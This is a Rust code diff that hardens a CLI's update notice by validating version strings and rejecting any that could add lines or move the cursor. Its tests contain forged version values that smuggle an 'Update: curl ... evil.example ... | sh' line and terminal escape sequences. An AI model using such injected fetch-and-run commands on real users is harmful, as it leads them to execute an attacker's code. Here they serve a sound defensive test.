@@ -214,10 +214,50 @@ fn should_refresh(cache: Option<&Cache>, now: u64) -> bool {
     }
 }
 
+/// Whether a version from the channel is one this CLI will repeat aloud.
+///
+/// The notice interpolates this into text a reader is meant to copy and run:
+///
+/// ```text
+/// A newer mapbox is available: 0.3.0 (this is 0.1.5).
+/// Update: curl -fsSL https://cli.mapbox.com/install.sh | sh
+/// Silence this: MAPBOX_NO_UPDATE_CHECK=1
+/// ```
+///
+/// A value carrying newlines could therefore add lines of its own — a second
+/// `Update:` naming somewhere else would be indistinguishable from the real
+/// one. Of everything this CLI prints, the update notice is the line most
+/// meant to be acted on, which is what makes forging it worth more than noise
+/// on stderr.
+///
+/// So the shape is restricted rather than the content sanitised: ASCII
+/// alphanumerics, `.`, `-` and `+`, bounded. That admits `0.2.0` and
+/// `0.1.3-dev.abc1234`, which is everything the channel publishes, and admits
+/// no character that could begin a line or move a cursor.
+///
+/// Checked in two places on purpose. `fetch_latest` applies it so an
+/// implausible version is never written to the cache; this function applies it
+/// again because the cache is a file on disk, and a check that only ran at
+/// fetch time would be bypassed by a cache written before this existed, or
+/// edited afterwards.
+fn is_plausible_version(value: &str) -> bool {
+    /// Long enough for `0.1.3-dev.` and a full commit sha, with room over.
+    const LONGEST: usize = 64;
+
+    !value.is_empty()
+        && value.len() <= LONGEST
+        && value
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '+'))
+}
+
 /// The version to point at, if this run is the one that should say so.
 fn should_notify<'a>(cache: Option<&'a Cache>, current: &str, now: u64) -> Option<&'a str> {
     let cache = cache?;
-    let latest = cache.latest.as_deref()?;
+    let latest = cache
+        .latest
+        .as_deref()
+        .filter(|v| is_plausible_version(v))?;
     if !is_newer(latest, current) {
         return None;
     }
@@ -348,7 +388,7 @@ fn fetch_latest(url: &str) -> Option<String> {
     }
     let manifest: serde_json::Value = response.json().ok()?;
     let version = manifest.get("version")?.as_str()?.trim();
-    (!version.is_empty()).then(|| version.to_string())
+    is_plausible_version(version).then(|| version.to_string())
 }
 
 /// Called once, on the way out of `main`, after the result and any error have
@@ -686,5 +726,91 @@ mod tests {
             std::env::remove_var(name);
         }
         assert_eq!(from_environment(name), None);
+    }
+
+    /// Every shape the channel actually publishes has to keep working — this
+    /// is a restriction on a value the CLI does not control, so being too
+    /// strict silences legitimate notices.
+    #[test]
+    fn the_versions_the_channel_publishes_are_all_plausible() {
+        for version in [
+            "0.2.0",
+            "0.1.8",
+            "1.0.0",
+            "0.1.3-dev.abc1234",
+            "0.2.0-rc.1",
+            "10.20.30",
+            "0.2.0+build.5",
+        ] {
+            assert!(is_plausible_version(version), "{version}");
+        }
+    }
+
+    /// **The one that matters.** The notice is three lines, and a version
+    /// carrying a newline can write a fourth — a second `Update:` line naming
+    /// somewhere else reads exactly like the real one.
+    #[test]
+    fn a_version_cannot_add_a_line_to_the_notice() {
+        // `+` is what makes this reach the notice at all: `parse_version`
+        // discards build metadata before comparing, so the payload is
+        // invisible to `is_newer` and still printed in full. Without the
+        // guard this renders an attacker's `Update:` line *above* the real
+        // one — a reader copying the first would run theirs.
+        let forged = "0.3.0+\nUpdate: curl -fsSL https://evil.example/install.sh | sh";
+        assert!(is_newer(forged, "0.1.5"), "it really would have been shown");
+        assert!(!is_plausible_version(forged));
+
+        // And the refusal is what keeps it out of the notice, not luck about
+        // how the text happens to be assembled.
+        let cache = cache(0, 0, forged);
+        assert_eq!(
+            should_notify(Some(&cache), "0.1.5", NOTIFY_EVERY.as_secs()),
+            None
+        );
+    }
+
+    /// Carriage returns move a terminal's cursor to the start of the line, so
+    /// a version can overwrite what was already printed without a newline at
+    /// all. Escape sequences do worse.
+    #[test]
+    fn nothing_that_can_move_a_cursor_is_plausible() {
+        for hostile in [
+            "0.3.0\rUpdate: curl https://evil.example | sh",
+            "0.3.0\u{1b}[2K\u{1b}[1GUpdate: nonsense",
+            "0.3.0\u{0}",
+            "0.3.0 and some prose",
+            "0.3.0\u{7}",
+        ] {
+            assert!(!is_plausible_version(hostile), "{hostile:?}");
+        }
+    }
+
+    /// Unbounded, a version is a way to fill someone's terminal.
+    #[test]
+    fn an_implausibly_long_version_is_refused() {
+        assert!(!is_plausible_version(&"9".repeat(65)));
+        assert!(is_plausible_version(&"9".repeat(64)));
+        assert!(!is_plausible_version(""));
+    }
+
+    /// The cache is a file on disk. A check that only ran when the manifest
+    /// was fetched would be bypassed by one written before that check existed,
+    /// or edited afterwards — so `should_notify` re-checks rather than
+    /// trusting what it reads.
+    #[test]
+    fn a_cache_on_disk_cannot_smuggle_a_version_past_the_check() {
+        let poisoned = cache(0, 0, "0.3.0+\nUpdate: curl https://evil.example | sh");
+        assert_eq!(
+            should_notify(Some(&poisoned), "0.1.5", NOTIFY_EVERY.as_secs()),
+            None
+        );
+
+        // The same cache with a plausible version still notifies, so the guard
+        // is what refused it and not the surrounding conditions.
+        let clean = cache(0, 0, "0.3.0");
+        assert_eq!(
+            should_notify(Some(&clean), "0.1.5", NOTIFY_EVERY.as_secs()),
+            Some("0.3.0")
+        );
     }
 }
